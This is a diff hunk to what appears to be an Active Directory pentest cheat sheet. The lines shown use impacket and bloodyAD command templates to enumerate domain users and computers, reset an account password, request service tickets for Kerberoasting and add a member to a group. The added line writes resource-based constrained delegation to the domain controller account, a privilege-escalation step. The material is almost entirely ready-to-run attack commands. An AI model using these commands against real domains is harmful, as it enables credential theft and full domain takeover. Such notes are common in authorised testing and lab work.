@@ -449,6 +449,8 @@ impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---
 impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
+impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
+
 
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
 
